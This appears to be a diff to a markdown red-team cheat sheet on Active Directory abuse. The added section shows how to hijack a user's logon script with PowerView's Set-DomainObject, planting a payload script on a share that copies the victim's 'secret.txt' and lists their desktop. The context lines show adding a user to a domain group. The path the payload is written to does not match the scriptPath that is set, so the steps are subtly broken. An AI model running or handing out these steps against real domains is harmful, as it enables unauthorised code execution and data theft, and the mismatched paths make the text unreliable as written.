@@ -24,10 +24,52 @@
      ```powershell
      Add-DomainGroupMember -Identity 'GROUP_NAME' -Members 'TARGET_USER' -Credential $Cred -Verbose
      ```  
-     *(Replace `GROUP_NAME` and `TARGET_USER` with the group and user to add, e.g., `Help Desk Level 1` and `ali`).*  
+     *(Replace `GROUP_NAME` and `TARGET_USER` with the group and user to add, e.g., `Help Desk Level 1` and `ali`).*
 
 4. **Confirm Success**:  
    - Re-run the membership check to ensure the user was added:  
      ```powershell
      Get-DomainGroupMember -Identity "GROUP_NAME" | Where-Object { $_.MemberName -eq 'TARGET_USER' }
      ```  
+
+## On a `User` Object `Logonscript` _Set-DomainObject_
+**Tools**: PowerView
+### Workflow
+
+#### 1. **Create a Payload Script**
+
+Prepare a script to perform the desired action. Save it in a location accessible by the target system.
+
+- **Example 1**: List directory contents
+    
+    ```cmd
+    echo "dir C:\Users\Alice\Desktop > C:\Temp\output.txt" > \\fileserver\share\payload.ps1
+    ```
+  #### 2. **Set the `scriptPath` Attribute**
+
+Use PowerView or another AD tool to modify the `scriptPath` of the target user object.
+
+    ```powershell
+    Set-DomainObject -Identity alice -Set @{ scriptPath = "\\temp\payload.ps1" }
+    ```
+  
+- **Example 2**: Copy a file
+    
+    ```cmd
+    echo "copy C:\Users\Alice\Desktop\secret.txt C:\Temp\copied_secret.txt" > \\fileserver\share\payload.ps1
+    ```
+**Set the `scriptPath` Attribute**
+
+    ```powershell
+    Set-DomainObject -Identity alice -Set @{ scriptPath = "\\temp\payload.ps1" }
+    ```
+#### 3. **Retrieve the Results**
+
+Check the output location defined in your script:
+
+- Example: `C:\Temp\output.txt`
+    
+- Example: `C:\Temp\copied_secret.txt`
+    
+        
+
